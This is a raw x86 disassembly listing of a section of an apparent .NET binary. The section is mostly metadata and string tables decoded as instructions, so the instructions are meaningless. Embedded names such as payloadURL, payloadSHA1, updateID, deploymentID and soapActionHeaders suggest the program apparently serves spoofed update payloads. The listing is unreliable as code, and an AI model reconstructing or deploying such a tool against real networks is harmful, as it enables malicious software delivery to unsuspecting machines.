  405ef9:	05 13 01 5c 00       	add    $0x5c0113,%eax
  405efe:	9b                   	fwait
  405eff:	16                   	push   %ss
  405f00:	2a 02                	sub    (%edx),%al
  405f02:	91                   	xchg   %eax,%ecx
  405f03:	00 d0                	add    %dl,%al
  405f05:	0c 59                	or     $0x59,%al
  405f07:	00 79 01             	add    %bh,0x1(%ecx)
  405f0a:	ef                   	out    %eax,(%dx)
  405f0b:	0c 7d                	or     $0x7d,%al
  405f0d:	05 21 01 a3 17       	add    $0x17a30121,%eax
  405f12:	3a 02                	cmp    (%edx),%al
  405f14:	79 01                	jns    0x405f17
  405f16:	70 19                	jo     0x405f31
  405f18:	c5 05 64 00 5a 11    	lds    0x115a0064,%eax
  405f1e:	40                   	inc    %eax
  405f1f:	04 6c                	add    $0x6c,%al
  405f21:	00 3a                	add    %bh,(%edx)
  405f23:	05 13 01 6c 00       	add    $0x6c0113,%eax
  405f28:	9b                   	fwait
  405f29:	16                   	push   %ss
  405f2a:	2a 02                	sub    (%edx),%al
  405f2c:	91                   	xchg   %eax,%ecx
  405f2d:	02 59 12             	add    0x12(%ecx),%bl
  405f30:	ec                   	in     (%dx),%al
  405f31:	05 c9 01 f7 04       	add    $0x4f701c9,%eax
  405f36:	f2 05 09 04 86 15    	repnz add $0x15860409,%eax
  405f3c:	fb                   	sti
  405f3d:	05 74 00 59 12       	add    $0x12590074,%eax
  405f42:	26 01 09             	add    %ecx,%es:(%ecx)
  405f45:	03 d1                	add    %ecx,%edx
  405f47:	17                   	pop    %ss
  405f48:	16                   	push   %ss
  405f49:	06                   	push   %es
  405f4a:	e9 03 66 08 22       	jmp    0x2248c552
  405f4f:	06                   	push   %es
  405f50:	11 04 cc             	adc    %eax,(%esp,%ecx,8)
  405f53:	05 3a 02 09 03       	add    $0x309023a,%eax
  405f58:	f1                   	int1
  405f59:	18 4a 01             	sbb    %cl,0x1(%edx)
  405f5c:	a1 01 93 05 28       	mov    0x28059301,%eax
  405f61:	06                   	push   %es
  405f62:	a9 02 e1 0d 59       	test   $0x590de102,%eax
  405f67:	00 d9                	add    %bl,%cl
  405f69:	01 7f 0e             	add    %edi,0xe(%edi)
  405f6c:	2e 06                	cs push %es
  405f6e:	09 04 86             	or     %eax,(%esi,%eax,4)
  405f71:	15 38 06 19 04       	adc    $0x4190638,%eax
  405f76:	8e 0b                	mov    (%ebx),%cs
  405f78:	46                   	inc    %esi
  405f79:	06                   	push   %es
  405f7a:	a1 01 cd 08 52       	mov    0x5208cd01,%eax
  405f7f:	06                   	push   %es
  405f80:	09 04 ee             	or     %eax,(%esi,%ebp,8)
  405f83:	18 59 06             	sbb    %bl,0x6(%ecx)
  405f86:	21 04 08             	and    %eax,(%eax,%ecx,1)
  405f89:	0c 5e                	or     $0x5e,%al
  405f8b:	06                   	push   %es
  405f8c:	a9 02 6d 05 65       	test   $0x65056d02,%eax
  405f91:	06                   	push   %es
  405f92:	79 01                	jns    0x405f95
  405f94:	28 0c 10             	sub    %cl,(%eax,%edx,1)
  405f97:	00 01                	add    %al,(%ecx)
  405f99:	04 77                	add    $0x77,%al
  405f9b:	14 6b                	adc    $0x6b,%al
  405f9d:	06                   	push   %es
  405f9e:	31 04 83             	xor    %eax,(%ebx,%eax,4)
  405fa1:	14 71                	adc    $0x71,%al
  405fa3:	06                   	push   %es
  405fa4:	7c 00                	jl     0x405fa6
  405fa6:	99                   	cltd
  405fa7:	17                   	pop    %ss
  405fa8:	3a 02                	cmp    (%edx),%al
  405faa:	7c 00                	jl     0x405fac
  405fac:	99                   	cltd
  405fad:	0d 86 06 e1 01       	or     $0x1e10686,%eax
  405fb2:	60                   	pusha
  405fb3:	0b 59 00             	or     0x0(%ecx),%ebx
  405fb6:	11 04 db             	adc    %eax,(%ebx,%ebx,8)
  405fb9:	05 01 00 11 04       	add    $0x4110001,%eax
  405fbe:	02 0f                	add    (%edi),%cl
  405fc0:	10 00                	adc    %al,(%eax)
  405fc2:	19 01                	sbb    %eax,(%ecx)
  405fc4:	bf 04 56 02 4c       	mov    $0x4c025604,%edi
  405fc9:	00 6a 0b             	add    %ch,0xb(%edx)
  405fcc:	13 01                	adc    (%ecx),%eax
  405fce:	b1 02                	mov    $0x2,%cl
  405fd0:	b0 11                	mov    $0x11,%al
  405fd2:	b0 06                	mov    $0x6,%al
  405fd4:	4c                   	dec    %esp
  405fd5:	00 60 0b             	add    %ah,0xb(%eax)
  405fd8:	2a 02                	sub    (%edx),%al
  405fda:	b1 02                	mov    $0x2,%cl
  405fdc:	c4 11                	les    (%ecx),%edx
  405fde:	b6 06                	mov    $0x6,%dh
  405fe0:	19 01                	sbb    %eax,(%ecx)
  405fe2:	5e                   	pop    %esi
  405fe3:	08 3a                	or     %bh,(%edx)
  405fe5:	02 08                	add    (%eax),%cl
  405fe7:	00 14 00             	add    %dl,(%eax,%eax,1)
  405fea:	d8 06                	fadds  (%esi)
  405fec:	08 00                	or     %al,(%eax)
  405fee:	18 00                	sbb    %al,(%eax)
  405ff0:	dd 06                	fldl   (%esi)
  405ff2:	0e                   	push   %cs
  405ff3:	00 24 00             	add    %ah,(%eax,%eax,1)
  405ff6:	e2 06                	loop   0x405ffe
  405ff8:	08 00                	or     %al,(%eax)
  405ffa:	8c 00                	mov    %es,(%eax)
  405ffc:	7e 07                	jle    0x406005
  405ffe:	08 00                	or     %al,(%eax)
  406000:	90                   	nop
  406001:	00 7e 07             	add    %bh,0x7(%esi)
  406004:	12 00                	adc    (%eax),%al
  406006:	91                   	xchg   %eax,%ecx
  406007:	00 83 07 12 00 99    	add    %al,-0x66ffedf9(%ebx)
  40600d:	00 83 07 08 00 c1    	add    %al,-0x3efff7f9(%ebx)
  406013:	00 88 07 0e 00 c5    	add    %cl,-0x3afff1f9(%eax)
  406019:	00 8d 07 12 00 c9    	add    %cl,-0x36ffedf9(%ebp)
  40601f:	00 83 07 2e 00 0b    	add    %al,0xb002e07(%ebx)
  406025:	00 0c 09             	add    %cl,(%ecx,%ecx,1)
  406028:	2e 00 13             	add    %dl,%cs:(%ebx)
  40602b:	00 15 09 2e 00 1b    	add    %dl,0x1b002e09
  406031:	00 34 09             	add    %dh,(%ecx,%ecx,1)
  406034:	2e 00 23             	add    %ah,%cs:(%ebx)
  406037:	00 3d 09 2e 00 2b    	add    %bh,0x2b002e09
  40603d:	00 75 09             	add    %dh,0x9(%ebp)
  406040:	2e 00 33             	add    %dh,%cs:(%ebx)
  406043:	00 86 09 2e 00 3b    	add    %al,0x3b002e09(%esi)
  406049:	00 91 09 2e 00 43    	add    %dl,0x43002e09(%ecx)
  40604f:	00 9e 09 2e 00 4b    	add    %bl,0x4b002e09(%esi)
  406055:	00 75 09             	add    %dh,0x9(%ebp)
  406058:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  40605c:	75 09                	jne    0x406067
  40605e:	43                   	inc    %ebx
  40605f:	00 5b 00             	add    %bl,0x0(%ebx)
  406062:	02 0a                	add    (%edx),%cl
  406064:	43                   	inc    %ebx
  406065:	00 0a                	add    %cl,(%edx)
  406067:	00 02                	add    %al,(%edx)
  406069:	0a 63 00             	or     0x0(%ebx),%ah
  40606c:	5b                   	pop    %ebx
  40606d:	00 02                	add    %al,(%edx)
  40606f:	0a 63 00             	or     0x0(%ebx),%ah
  406072:	0a 00                	or     (%eax),%al
  406074:	02 0a                	add    (%edx),%cl
  406076:	63 00                	arpl   %eax,(%eax)
  406078:	63 00                	arpl   %eax,(%eax)
  40607a:	98                   	cwtl
  40607b:	0b 83 00 5b 00 02    	or     0x2005b00(%ebx),%eax
  406081:	0a 83 00 0a 00 02    	or     0x2000a00(%ebx),%al
  406087:	0a 83 00 63 00 bf    	or     -0x40ff9d00(%ebx),%al
  40608d:	0b a3 01 5b 00 02    	or     0x2005b01(%ebx),%esp
  406093:	0a c3                	or     %bl,%al
  406095:	01 5b 00             	add    %ebx,0x0(%ebx)
  406098:	02 0a                	add    (%edx),%cl
  40609a:	e3 01                	jecxz  0x40609d
  40609c:	5b                   	pop    %ebx
  40609d:	00 02                	add    %al,(%edx)
  40609f:	0a 03                	or     (%ebx),%al
  4060a1:	02 5b 00             	add    0x0(%ebx),%bl
  4060a4:	02 0a                	add    (%edx),%cl
  4060a6:	23 02                	and    (%edx),%eax
  4060a8:	5b                   	pop    %ebx
  4060a9:	00 02                	add    %al,(%edx)
  4060ab:	0a 40 02             	or     0x2(%eax),%al
  4060ae:	6b 00 d2             	imul   $0xffffffd2,(%eax),%eax
  4060b1:	09 40 02             	or     %eax,0x2(%eax)
  4060b4:	73 00                	jae    0x4060b6
  4060b6:	02 0a                	add    (%edx),%cl
  4060b8:	43                   	inc    %ebx
  4060b9:	02 5b 00             	add    0x0(%ebx),%bl
  4060bc:	02 0a                	add    (%edx),%cl
  4060be:	63 02                	arpl   %eax,(%edx)
  4060c0:	5b                   	pop    %ebx
  4060c1:	00 02                	add    %al,(%edx)
  4060c3:	0a 83 02 5b 00 02    	or     0x2005b02(%ebx),%al
  4060c9:	0a a3 02 5b 00 02    	or     0x2005b02(%ebx),%ah
  4060cf:	0a 40 03             	or     0x3(%eax),%al
  4060d2:	6b 00 07             	imul   $0x7,(%eax),%eax
  4060d5:	0a 40 03             	or     0x3(%eax),%al
  4060d8:	73 00                	jae    0x4060da
  4060da:	02 0a                	add    (%edx),%cl
  4060dc:	60                   	pusha
  4060dd:	03 6b 00             	add    0x0(%ebx),%ebp
  4060e0:	54                   	push   %esp
  4060e1:	0a 60 03             	or     0x3(%eax),%ah
  4060e4:	73 00                	jae    0x4060e6
  4060e6:	02 0a                	add    (%edx),%cl
  4060e8:	80 03 6b             	addb   $0x6b,(%ebx)
  4060eb:	00 8e 0a 80 03 73    	add    %cl,0x7303800a(%esi)
  4060f1:	00 02                	add    %al,(%edx)
  4060f3:	0a a0 03 6b 00 c9    	or     -0x36ff94fd(%eax),%ah
  4060f9:	0a a0 03 73 00 02    	or     0x2007303(%eax),%ah
  4060ff:	0a c0                	or     %al,%al
  406101:	03 6b 00             	add    0x0(%ebx),%ebp
  406104:	0d 0b c0 03 73       	or     $0x7303c00b,%eax
  406109:	00 02                	add    %al,(%edx)
  40610b:	0a e0                	or     %al,%ah
  40610d:	03 22                	add    (%edx),%esp
  40610f:	00 4c 0b e0          	add    %cl,-0x20(%ebx,%ecx,1)
  406113:	03 6b 00             	add    0x0(%ebx),%ebp
  406116:	52                   	push   %edx
  406117:	0b e0                	or     %eax,%esp
  406119:	03 73 00             	add    0x0(%ebx),%esi
  40611c:	02 0a                	add    (%edx),%cl
  40611e:	e0 03                	loopne 0x406123
  406120:	5b                   	pop    %ebx
  406121:	00 02                	add    %al,(%edx)
  406123:	0a 60 05             	or     0x5(%eax),%ah
  406126:	8b 00                	mov    (%eax),%eax
  406128:	02 0a                	add    (%edx),%cl
  40612a:	c0 05 8b 00 02 0a 80 	rolb   $0x80,0xa02008b
  406131:	06                   	push   %es
  406132:	8b 00                	mov    (%eax),%eax
  406134:	02 0a                	add    (%edx),%cl
  406136:	e0 06                	loopne 0x40613e
  406138:	8b 00                	mov    (%eax),%eax
  40613a:	02 0a                	add    (%edx),%cl
  40613c:	40                   	inc    %eax
  40613d:	07                   	pop    %es
  40613e:	8b 00                	mov    (%eax),%eax
  406140:	02 0a                	add    (%edx),%cl
  406142:	a0 07 8b 00 02       	mov    0x2008b07,%al
  406147:	0a 00                	or     (%eax),%al
  406149:	08 8b 00 02 0a 41    	or     %cl,0x410a0200(%ebx)
  40614f:	09 1a                	or     %ebx,(%edx)
  406151:	00 8d 0b c1 0b 1a    	add    %cl,0x1a0bc10b(%ebp)
  406157:	00 8d 0b 27 00 8d    	add    %cl,-0x72ffd8f5(%ebp)
  40615d:	00 d4                	add    %dl,%ah
  40615f:	00 01                	add    %al,(%ecx)
  406161:	01 5d 01             	add    %ebx,0x1(%ebp)
  406164:	74 01                	je     0x406167
  406166:	af                   	scas   %es:(%edi),%eax
  406167:	01 46 02             	add    %eax,0x2(%esi)
  40616a:	5c                   	pop    %esp
  40616b:	02 66 02             	add    0x2(%esi),%ah
  40616e:	70 02                	jo     0x406172
  406170:	7a 02                	jp     0x406174
  406172:	84 02                	test   %al,(%edx)
  406174:	8e 02                	mov    (%edx),%es
  406176:	a3 02 ba 02 d3       	mov    %eax,0xd302ba02
  40617b:	03 1d 04 a5 04 d3    	add    0xd304a504,%ebx
  406181:	04 1e                	add    $0x1e,%al
  406183:	05 8c 05 8c 06       	add    $0x68c058c,%eax
  406188:	9e                   	sahf
  406189:	06                   	push   %es
  40618a:	0e                   	push   %cs
  40618b:	00 54 00 1f          	add    %dl,0x1f(%eax,%eax,1)
  40618f:	00 0e                	add    %cl,(%esi)
  406191:	00 56 00             	add    %dl,0x0(%esi)
  406194:	21 00                	and    %eax,(%eax)
  406196:	0f 00 5a 00          	ltr    0x0(%edx)
  40619a:	1f                   	pop    %ds
  40619b:	00 0f                	add    %cl,(%edi)
  40619d:	00 5c 00 21          	add    %bl,0x21(%eax,%eax,1)
  4061a1:	00 11                	add    %dl,(%ecx)
  4061a3:	00 66 00             	add    %ah,0x0(%esi)
  4061a6:	1f                   	pop    %ds
  4061a7:	00 11                	add    %dl,(%ecx)
  4061a9:	00 68 00             	add    %ch,0x0(%eax)
  4061ac:	21 00                	and    %eax,(%eax)
  4061ae:	12 00                	adc    (%eax),%al
  4061b0:	6c                   	insb   (%dx),%es:(%edi)
  4061b1:	00 1f                	add    %bl,(%edi)
  4061b3:	00 12                	add    %dl,(%edx)
  4061b5:	00 6e 00             	add    %ch,0x0(%esi)
  4061b8:	21 00                	and    %eax,(%eax)
  4061ba:	13 00                	adc    (%eax),%eax
  4061bc:	72 00                	jb     0x4061be
  4061be:	1f                   	pop    %ds
  4061bf:	00 13                	add    %dl,(%ebx)
  4061c1:	00 74 00 21          	add    %dh,0x21(%eax,%eax,1)
  4061c5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4061c8:	78 00                	js     0x4061ca
  4061ca:	1f                   	pop    %ds
  4061cb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4061ce:	7a 00                	jp     0x4061d0
  4061d0:	21 00                	and    %eax,(%eax)
  4061d2:	15 00 7e 00 1f       	adc    $0x1f007e00,%eax
  4061d7:	00 15 00 80 00 21    	add    %dl,0x21008000
  4061dd:	00 0d 0d 45 00 1e    	add    %cl,0x1e00450d
  4061e3:	01 be 01 e1 01 0e    	add    %edi,0xe01e101(%esi)
  4061e9:	02 21                	add    (%ecx),%ah
  4061eb:	02 38                	add    (%eax),%bh
  4061ed:	04 49                	add    $0x49,%al
  4061ef:	04 b7                	add    $0xb7,%al
  4061f1:	04 66                	add    $0x66,%al
  4061f3:	05 6d 05 d2 05       	add    $0x5d2056d,%eax
  4061f8:	da 05 06 06 7d 06    	fiaddl 0x67d0606
  4061fe:	00 01                	add    %al,(%ecx)
  406200:	17                   	pop    %ss
  406201:	00 8b 0e 01 00 04    	add    %cl,0x400010e(%ebx)
  406207:	80 00 00             	addb   $0x0,(%eax)
  40620a:	01 00                	add    %eax,(%eax)
	...
  406218:	f9                   	stc
  406219:	15 00 00 04 00       	adc    $0x40000,%eax
	...
  406226:	00 00                	add    %al,(%eax)
  406228:	bd 06 6f 04 00       	mov    $0x46f06,%ebp
  40622d:	00 00                	add    %al,(%eax)
  40622f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40623a:	00 00                	add    %al,(%eax)
  40623c:	bd 06 ab 0d 00       	mov    $0xdab06,%ebp
  406241:	00 00                	add    %al,(%eax)
  406243:	00 03                	add    %al,(%ebx)
  406245:	00 01                	add    %al,(%ecx)
  406247:	00 08                	add    %cl,(%eax)
  406249:	05 00 00 00 00       	add    $0x0,%eax
  40624e:	00 00                	add    %al,(%eax)
  406250:	c6 06 de             	movb   $0xde,(%esi)
  406253:	1a 00                	sbb    (%eax),%al
  406255:	00 00                	add    %al,(%eax)
  406257:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406262:	00 00                	add    %al,(%eax)
  406264:	bd 06 ca 07 00       	mov    $0x7ca06,%ebp
  406269:	00 00                	add    %al,(%eax)
  40626b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406276:	00 00                	add    %al,(%eax)
  406278:	bd 06 ac 0f 00       	mov    $0xfac06,%ebp
  40627d:	00 00                	add    %al,(%eax)
  40627f:	00 01                	add    %al,(%ecx)
  406281:	00 08                	add    %cl,(%eax)
  406283:	00 05 00 00 00 00    	add    %al,0x0
  406289:	00 00                	add    %al,(%eax)
  40628b:	00 cf                	add    %cl,%bh
  40628d:	06                   	push   %es
  40628e:	68 0f 00 00 00       	push   $0xf
  406293:	00 0d 00 09 00 0e    	add    %cl,0xe000900
  406299:	00 0a                	add    %cl,(%edx)
  40629b:	00 0f                	add    %cl,(%edi)
  40629d:	00 0b                	add    %cl,(%ebx)
  40629f:	00 10                	add    %dl,(%eax)
  4062a1:	00 0b                	add    %cl,(%ebx)
  4062a3:	00 11                	add    %dl,(%ecx)
  4062a5:	00 0b                	add    %cl,(%ebx)
  4062a7:	00 12                	add    %dl,(%edx)
  4062a9:	00 0b                	add    %cl,(%ebx)
  4062ab:	00 13                	add    %dl,(%ebx)
  4062ad:	00 0b                	add    %cl,(%ebx)
  4062af:	00 14 00             	add    %dl,(%eax,%eax,1)
  4062b2:	0b 00                	or     (%eax),%eax
  4062b4:	15 00 0b 00 7f       	adc    $0x7f000b00,%eax
  4062b9:	00 46 01             	add    %al,0x1(%esi)
  4062bc:	81 00 46 01 8b 00    	addl   $0x8b0146,(%eax)
  4062c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4062c3:	01 df                	add    %ebx,%edi
  4062c5:	00 51 02             	add    %dl,0x2(%ecx)
  4062c8:	df 00                	filds  (%eax)
  4062ca:	61                   	popa
  4062cb:	02 df                	add    %bh,%bl
  4062cd:	00 6b 02             	add    %ch,0x2(%ebx)
  4062d0:	df 00                	filds  (%eax)
  4062d2:	75 02                	jne    0x4062d6
  4062d4:	df 00                	filds  (%eax)
  4062d6:	7f 02                	jg     0x4062da
  4062d8:	8b 00                	mov    (%eax),%eax
  4062da:	89 02                	mov    %eax,(%edx)
  4062dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4062dd:	01 5b 04             	add    %ebx,0x4(%ebx)
  4062e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4062e1:	01 98 04 6f 01 c6    	add    %ebx,-0x39fe90fc(%eax)
  4062e7:	04 a1                	add    $0xa1,%al
  4062e9:	01 f8                	add    %edi,%eax
  4062eb:	04 a1                	add    $0xa1,%al
  4062ed:	01 53 05             	add    %edx,0x5(%ebx)
  4062f0:	a1 01 73 05 a1       	mov    0xa1057301,%eax
  4062f5:	01 be 05 a1 01 e1    	add    %edi,-0x1efe5efb(%esi)
  4062fb:	05 7f 00 10 06       	add    $0x610007f,%eax
  406300:	df 01                	filds  (%ecx)
  406302:	10 06                	adc    %al,(%esi)
  406304:	e5 01                	in     $0x1,%eax
  406306:	10 06                	adc    %al,(%esi)
  406308:	ef                   	out    %eax,(%dx)
  406309:	01 10                	add    %edx,(%eax)
  40630b:	06                   	push   %es
  40630c:	81 00 10 06 a1 01    	addl   $0x1a10610,(%eax)
  406312:	97                   	xchg   %eax,%edi
  406313:	06                   	push   %es
  406314:	a1 01 a9 06 00       	mov    0x6a901,%eax
  406319:	00 00                	add    %al,(%eax)
  40631b:	00 00                	add    %al,(%eax)
  40631d:	3c 72                	cmp    $0x72,%al
  40631f:	65 74 75             	gs je  0x406397
  406322:	72 6e                	jb     0x406392
  406324:	65 64 42             	gs fs inc %edx
  406327:	6f                   	outsl  %ds:(%esi),(%dx)
  406328:	64 79 3e             	fs jns 0x406369
  40632b:	35 5f 5f 31 30       	xor    $0x30315f5f,%eax
  406330:	00 70 61             	add    %dh,0x61(%eax)
  406333:	74 68                	je     0x40639d
  406335:	57                   	push   %edi
  406336:	69 6e 31 30 00 3c 77 	imul   $0x773c0030,0x31(%esi),%ebp
  40633d:	72 69                	jb     0x4063a8
  40633f:	74 65                	je     0x4063a6
  406341:	54                   	push   %esp
  406342:	6f                   	outsl  %ds:(%esi),(%dx)
  406343:	43                   	inc    %ebx
  406344:	6f                   	outsl  %ds:(%esi),(%dx)
  406345:	6e                   	outsb  %ds:(%esi),(%dx)
  406346:	73 6f                	jae    0x4063b7
  406348:	6c                   	insb   (%dx),%es:(%edi)
  406349:	65 3e 64 5f          	gs ds fs pop %edi
  40634d:	5f                   	pop    %edi
  40634e:	33 30                	xor    (%eax),%esi
  406350:	00 3c 2e             	add    %bh,(%esi,%ebp,1)
  406353:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  406357:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40635b:	32 32                	xor    (%edx),%dh
  40635d:	5f                   	pop    %edi
  40635e:	30 00                	xor    %al,(%eax)
  406360:	3c 2e                	cmp    $0x2e,%al
  406362:	63 63 74             	arpl   %esp,0x74(%ebx)
  406365:	6f                   	outsl  %ds:(%esi),(%dx)
  406366:	72 3e                	jb     0x4063a6
  406368:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40636b:	34 5f                	xor    $0x5f,%al
  40636d:	30 00                	xor    %al,(%eax)
  40636f:	3c 3e                	cmp    $0x3e,%al
  406371:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  406374:	32 38                	xor    (%eax),%bh
  406376:	5f                   	pop    %edi
  406377:	30 00                	xor    %al,(%eax)
  406379:	3c 6f                	cmp    $0x6f,%al
  40637b:	6e                   	outsb  %ds:(%esi),(%dx)
  40637c:	52                   	push   %edx
  40637d:	65 73 70             	gs jae 0x4063f0
  406380:	6f                   	outsl  %ds:(%esi),(%dx)
  406381:	6e                   	outsb  %ds:(%esi),(%dx)
  406382:	73 65                	jae    0x4063e9
  406384:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  406388:	32 38                	xor    (%eax),%bh
  40638a:	5f                   	pop    %edi
  40638b:	30 00                	xor    %al,(%eax)
  40638d:	3c 73                	cmp    $0x73,%al
  40638f:	6f                   	outsl  %ds:(%esi),(%dx)
  406390:	61                   	popa
  406391:	70 41                	jo     0x4063d4
  406393:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  406397:	6e                   	outsb  %ds:(%esi),(%dx)
  406398:	48                   	dec    %eax
  406399:	65 61                	gs popa
  40639b:	64 65 72 73          	fs gs jb 0x406412
  40639f:	3e 35 5f 5f 31 31    	ds xor $0x31315f5f,%eax
  4063a5:	00 70 61             	add    %dh,0x61(%eax)
  4063a8:	79 6c                	jns    0x406416
  4063aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4063ab:	61                   	popa
  4063ac:	64 53                	fs push %ebx
  4063ae:	48                   	dec    %eax
  4063af:	41                   	inc    %ecx
  4063b0:	31 00                	xor    %eax,(%eax)
  4063b2:	75 70                	jne    0x406424
  4063b4:	64 61                	fs popa
  4063b6:	74 65                	je     0x40641d
  4063b8:	49                   	dec    %ecx
  4063b9:	44                   	inc    %esp
  4063ba:	31 00                	xor    %eax,(%eax)
  4063bc:	64 65 70 6c          	fs gs jo 0x40642c
  4063c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4063c1:	79 6d                	jns    0x406430
  4063c3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4063c5:	74 49                	je     0x406410
  4063c7:	44                   	inc    %esp
  4063c8:	31 00                	xor    %eax,(%eax)
  4063ca:	3c 68                	cmp    $0x68,%al
  4063cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4063cd:	73 74                	jae    0x406443
  4063cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4063d0:	61                   	popa
  4063d1:	6d                   	insl   (%dx),%es:(%edi)
  4063d2:	65 3e 35 5f 5f 31 00 	gs ds xor $0x315f5f,%eax
  4063d9:	3c 65                	cmp    $0x65,%al
  4063db:	78 69                	js     0x406446
  4063dd:	73 74                	jae    0x406453
  4063df:	69 6e 67 3e 35 5f 5f 	imul   $0x5f5f353e,0x67(%esi),%ebp
  4063e6:	31 00                	xor    %eax,(%eax)
  4063e8:	3c 63                	cmp    $0x63,%al
  4063ea:	6c                   	insb   (%dx),%es:(%edi)
  4063eb:	69 65 6e 74 4c 6f 63 	imul   $0x636f4c74,0x6e(%ebp),%esp
  4063f2:	61                   	popa
  4063f3:	6c                   	insb   (%dx),%es:(%edi)
  4063f4:	49                   	dec    %ecx
  4063f5:	70 3e                	jo     0x406435
  4063f7:	35 5f 5f 31 00       	xor    $0x315f5f,%eax
  4063fc:	3c 72                	cmp    $0x72,%al
  4063fe:	75 6e                	jne    0x40646e
  406400:	53                   	push   %ebx
  406401:	65 72 76             	gs jb  0x40647a
  406404:	65 72 3e             	gs jb  0x406445
  406407:	35 5f 5f 31 00       	xor    $0x315f5f,%eax
  40640c:	3c 70                	cmp    $0x70,%al
  40640e:	68 65 78 3e 35       	push   $0x353e7865
  406413:	5f                   	pop    %edi
  406414:	5f                   	pop    %edi
  406415:	31 00                	xor    %eax,(%eax)
  406417:	3c 3e                	cmp    $0x3e,%al
  406419:	75 5f                	jne    0x40647a
  40641b:	5f                   	pop    %edi
  40641c:	31 00                	xor    %eax,(%eax)
  40641e:	4e                   	dec    %esi
  40641f:	75 6c                	jne    0x40648d
  406421:	6c                   	insb   (%dx),%es:(%edi)
  406422:	61                   	popa
  406423:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  406427:	31 00                	xor    %eax,(%eax)
  406429:	49                   	dec    %ecx
  40642a:	45                   	inc    %ebp
  40642b:	6e                   	outsb  %ds:(%esi),(%dx)
  40642c:	75 6d                	jne    0x40649b
  40642e:	65 72 61             	gs jb  0x406492
  406431:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  406435:	31 00                	xor    %eax,(%eax)
  406437:	54                   	push   %esp
  406438:	61                   	popa
  406439:	73 6b                	jae    0x4064a6
  40643b:	60                   	pusha
  40643c:	31 00                	xor    %eax,(%eax)
  40643e:	41                   	inc    %ecx
  40643f:	73 79                	jae    0x4064ba
  406441:	6e                   	outsb  %ds:(%esi),(%dx)
  406442:	63 45 76             	arpl   %eax,0x76(%ebp)
  406445:	65 6e                	outsb  %gs:(%esi),(%dx)
  406447:	74 48                	je     0x406491
  406449:	61                   	popa
  40644a:	6e                   	outsb  %ds:(%esi),(%dx)
  40644b:	64 6c                	fs insb (%dx),%es:(%edi)
  40644d:	65 72 60             	gs jb  0x4064b0
  406450:	31 00                	xor    %eax,(%eax)
  406452:	54                   	push   %esp
  406453:	61                   	popa
  406454:	73 6b                	jae    0x4064c1
  406456:	41                   	inc    %ecx
  406457:	77 61                	ja     0x4064ba
  406459:	69 74 65 72 60 31 00 	imul   $0x4c003160,0x72(%ebp,%eiz,2),%esi
  406460:	4c 
  406461:	69 73 74 60 31 00 75 	imul   $0x75003160,0x74(%ebx),%esi
  406468:	75 69                	jne    0x4064d3
  40646a:	64 31 00             	xor    %eax,%fs:(%eax)
  40646d:	67 65 74 5f          	addr16 gs je 0x4064d0
  406471:	50                   	push   %eax
  406472:	72 69                	jb     0x4064dd
  406474:	6d                   	insl   (%dx),%es:(%edi)
  406475:	65 31 00             	xor    %eax,%gs:(%eax)
  406478:	4f                   	dec    %edi
  406479:	72 67                	jb     0x4064e2
  40647b:	2e 42                	cs inc %edx
  40647d:	6f                   	outsl  %ds:(%esi),(%dx)
  40647e:	75 6e                	jne    0x4064ee
  406480:	63 79 43             	arpl   %edi,0x43(%ecx)
  406483:	61                   	popa
  406484:	73 74                	jae    0x4064fa
  406486:	6c                   	insb   (%dx),%es:(%edi)
  406487:	65 2e 41             	gs cs inc %ecx
  40648a:	73 6e                	jae    0x4064fa
  40648c:	31 00                	xor    %eax,(%eax)
  40648e:	67 65 74 5f          	addr16 gs je 0x4064f1
  406492:	45                   	inc    %ebp
  406493:	78 70                	js     0x406505
  406495:	6f                   	outsl  %ds:(%esi),(%dx)
  406496:	6e                   	outsb  %ds:(%esi),(%dx)
  406497:	65 6e                	outsb  %gs:(%esi),(%dx)
  406499:	74 31                	je     0x4064cc
  40649b:	00 3c 70             	add    %bh,(%eax,%esi,2)
  40649e:	61                   	popa
  40649f:	79 6c                	jns    0x40650d
  4064a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4064a2:	61                   	popa
  4064a3:	64 55                	fs push %ebp
  4064a5:	52                   	push   %edx
  4064a6:	4c                   	dec    %esp
  4064a7:	3e 35 5f 5f 31 32    	ds xor $0x32315f5f,%eax
  4064ad:	00 4d 69             	add    %cl,0x69(%ebp)
  4064b0:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4064b3:	73 6f                	jae    0x406524
  4064b5:	66 74 2e             	data16 je 0x4064e6
  4064b8:	57                   	push   %edi
  4064b9:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  4064c0:	49                   	dec    %ecx
  4064c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4064c2:	74 33                	je     0x4064f7
  4064c4:	32 00                	xor    (%eax),%al
  4064c6:	75 70                	jne    0x406538
  4064c8:	64 61                	fs popa
  4064ca:	74 65                	je     0x406531
  4064cc:	49                   	dec    %ecx
  4064cd:	44                   	inc    %esp
  4064ce:	32 00                	xor    (%eax),%al
  4064d0:	64 65 70 6c          	fs gs jo 0x406540
  4064d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4064d5:	79 6d                	jns    0x406544
  4064d7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4064d9:	74 49                	je     0x406524
  4064db:	44                   	inc    %esp
  4064dc:	32 00                	xor    (%eax),%al
  4064de:	3c 68                	cmp    $0x68,%al
